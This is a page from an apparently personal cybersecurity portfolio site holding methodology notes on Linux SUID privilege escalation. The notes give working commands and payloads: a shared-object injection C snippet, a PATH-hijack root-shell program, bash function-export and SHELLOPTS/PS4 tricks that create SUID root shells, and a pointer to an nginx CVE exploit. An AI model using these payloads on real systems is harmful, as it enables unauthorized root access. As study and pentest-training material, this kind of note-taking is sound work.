<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <link rel="stylesheet" href="https://unicons.iconscout.com/release/v4.0.0/css/line.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">

    <link rel="stylesheet" href="../../../../../../assets/css/swiper-bundle.min.css">

    <!--==================== CSS ====================-->
    <link rel="stylesheet" href="../../../../../../assets/css/method-styles.css">

    <title>Methodology</title>
</head>
<body class="dark-theme">
    <!--==================== HEADER ====================-->
    <header class="header" id="header">
        <nav class="nav container">
            <a href="../../../../../index.html#home" class="nav__logo">Tyler O'Hare</a>
            <div class="nav__menu" id="nav-menu">
                <ul class="nav__list grid">
                    <li class="nav__item">
                        <a href="../../../../../index.html#home" class="nav__link">
                            <i class="uil uil-estate nav__icon"></i> Home
                        </a>
                    </li>
                    <li class="nav__item">
                        <a href="../../../../../index.html#skills" class="nav__link">
                            <i class="uil uil-file-alt nav__icon"></i> Skills
                        </a>
                    </li>
                    <li class="nav__item">
                        <a href="../../../../../index.html#portfolio" class="nav__link">
                            <i class="uil uil-scenery nav__icon"></i> Portfolio
                        </a>
                    </li>
                    <li class="nav__item">
                        <a href="../../../../../index.html#contact" class="nav__link">
                            <i class="uil uil-estate nav__icon"></i> Contact Me
                        </a>
                    </li>
                    <li class="nav__item">
                        <a href="../../../../../../assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449.html" class="nav__link active-link">
                            <i class="uil uil-estate nav__icon"></i> Methodology
                        </a>
                    </li>
                </ul>
                <i class="uil uil-times nav__close" id="nav-close"></i>
            </div>

            <div class="nav__btns">
                <!--Theme change button-->
                <i class="uil uil-moon change-theme" id="theme-button"></i>

                <div class="nav__toggle" id="nav-toggle">
                    <i class="uil uil-apps"></i>
                </div>
            </div>
        </nav>
    </header>
    <!--==================== END-HEADER ====================-->


<!--==================== MAIN ====================-->
    <main class="main"><article id="9b5b8477-b2d4-424d-866b-934aa7614047" class="page sans"><header><h1 class="page-title">SUID Escalations</h1></header><div class="page-body"><h3 id="44382a93-8b33-4888-843a-ce15e05bcfc1" class="">SUID Vulnerabilities:</h3><pre id="3511a98d-6799-4fe0-a3aa-498c1cb355aa" class="code code-wrap"><code>find / -perm -u=s -type f 2&gt;/dev/null
# ls -la the results</code></pre><p id="fe8766c8-846d-43d2-b36f-0050e9a13bb7" class="">GTFObin -&gt; SUID look through them</p><p id="f27d9305-4149-47cd-93af-59092098450b" class=""><a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p><h3 id="7b27c77b-74f6-487b-8344-d7254c526f99" class="">Other SUID Escalations</h3><p id="11afc55f-82e6-421b-a7bc-6758a06d8d77" class=""><strong>Shared object Injection:</strong> </p><ul id="ac964fd1-1f35-4877-a0df-3dc03e13ac39" class="bulleted-list"><li style="list-style-type:disc">Looking for -so files?</li></ul><p id="ec31e6c6-fa4b-44ec-8be6-8e7b06e96333" class="">Strace -&gt; monitor and tamper kernel processes</p><pre id="7b9a4f65-6216-4643-b728-c0f8d285fe23" class="code code-wrap"><code>find / -perm -u=s -type f 2&gt;/dev/null
strace /user/local/bin/suid-so 2&gt;&amp;1
# Look for no such file or dierctory...
strace /user/local/bin/suid-so 2&gt;&amp;1 | grep -i -E &quot;open|access|no such file&quot;</code></pre><p id="8c6b41e5-8d89-4ae4-9c13-1bb293856921" class="">Create a file to overwrite the found dependent files...</p><p id="b3875892-2bdc-4d36-8eb0-3504fbb509f0" class="">libcalc.c</p><pre id="502c69e8-ca7b-4bbf-9671-27db04aba1a3" class="code code-wrap"><code>#include stdio.h
#include stdlib.h


static void inject() __attribute((constructor));

void inject() {
system(&quot;cp /bin/bash /tmp/bash &amp;&amp; chmod +s /tmp/bash &amp;&amp; /tmp/bash -p&quot;);
}</code></pre><p id="677fbf93-cb8f-4dbc-af5f-57e786aa2283" class="">Then:</p><pre id="f3cafe12-f55f-469c-9b34-6561b799b5fc" class="code"><code>chmod +s file
gcc  -shared -fPIC libcalc.c -o libcalc.so
/usr/local/bin/suid-so</code></pre><h3 id="1c62579c-196a-48fd-adb9-f55063cef9c2" class="">Binary Simlinks</h3><p id="2239fdfa-5381-4ced-916d-fcbaceeca4c5" class=""><a href="https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html">https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html</a></p><ul id="17752750-433a-4cf9-8bff-378f934f36c9" class="bulleted-list"><li style="list-style-type:disc">Find with linux exploit suggester (CVE-2016-1247)</li></ul><ul id="b0403d62-3b74-4084-b47e-c7d86890c568" class="bulleted-list"><li style="list-style-type:disc">nginxed-root.sh</li></ul><ul id="7f0cc8d6-721b-49da-a87d-67f37e73e405" class="bulleted-list"><li style="list-style-type:disc">Works on Nginx servers</li></ul><pre id="f2d40c5f-e626-4d5f-b866-cfb0187718c5" class="code code-wrap"><code>dpkg -l nginx</code></pre><p id="61d5a330-c00f-4b3e-837f-0887993b76bf" class="">Simlink to replace log files with malicious file...</p><h3 id="89023850-67ae-411d-842c-58b75e434212" class="">Environmental Variables</h3><p id="c17b1729-cfcf-4088-8085-24359b8ba83b" class="">
</p><p id="efa99f70-8816-47ec-a1a9-7ccf88443833" class="">What if we change the environmental PATH variables</p><pre id="97d9923a-2740-4cd9-8794-e793d132ebdb" class="code code-wrap"><code>env
strings the service being run
echo &#x27;int main() { setgid(0); setuid(0); system(&quot;/bin/bash&quot;); return 0;}&#x27; &gt; /tmp/service

#For explicit services
#change the path to our malicious service</code></pre><p id="ca93916d-0ddb-4494-8d3e-e0e6f2d4c259" class="">
</p><p id="7ead9643-c3b3-4078-9753-fff4f63890b1" class=""><strong>Abusing shell features:</strong></p><pre id="c80ed1b8-e439-4f5c-918f-9647c38604e5" class="code"><code>#/bin/sh version exploit
#1. search for SUID and GUIDs
#2. check program with strings, strace, ltrace
#3. if /bin/sh is used check version
/bin/sh --version
#4. if sh version is lower thatn 4.2-048 ...
function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service
/usr/local/bin/suid-found
id

--------
#SHELLOPTS -&gt; below bash 4.4
#1. search for SUID and GUIDs
#2. check program with strings, strace, ltrace
#3. if /bin/sh is used check version
/bin/sh --version
#4. if sh version is lower thatn 4.4...
env -i SHELLOPTS=xtrace PS4=&#x27;${cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash}&#x27; /usr/local/bin/suid-found
/tmp/rootbash -p</code></pre></div></article></main></main>

    <!--==================== FOOTER ====================-->
    <footer class="footer">
        <div class="footer__bg">
            <div class="footer__container container grid">
                <div>
                    <h1 class="footer__title">Tyler O'Hare</h1>
                    <span class="footer__subtitle">Cybersecurity Engineer</span>
                </div>

                <ul class="footer__links">
                    <li>
                        <a href="../../../../../index.html#skills" class="footer__link">Skills</a>
                    </li>

                    <li>
                        <a href="../../../../../index.html#portfolio" class="footer__link">Portfolio</a>
                    </li>

                    <li>
                        <a href="../../../../../../../index.html#contact" class="footer__link">Contact</a>
                    </li>
                    <li>
                        <a href="../../../../../../assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449.html" class="footer__link">Methodology</a>
                    </li>
                </ul>

                <div class="footer__socials">
                    <a href="https://github.com/tyohare" target="_blank" class="footer__social">
                        <i class="uil uil-github-alt"></i>
                    </a>

                    <a href="https://www.linkedin.com/in/tyler-ohare-72b26923a/" target="_blank" class="footer__social" class="footer__social">
                        <i class="uil uil-linkedin-alt"></i>
                    </a>
                </div>
            </div>

            <p class="footer__copy">&#169; Tyler O'Hare. All rights reserved.</p>
        </div>

    </footer>
    <!--==================== END-FOOTER ====================-->


    <!--==================== SCROLL TOP ====================-->
    <a href="" class="scrollup" id="scroll-up">
        <i class="uil uil-arrow-up scroll__icon"></i>
    </a>

    <!--==================== SWIPER JS ====================-->
    <script src="../../../../../../assets/js/swiper-bundle.min.js"></script>

    <!--==================== MAIN JS ====================-->
    <script src="../../../../../../assets/js/main.js"></script>
</body>
</html>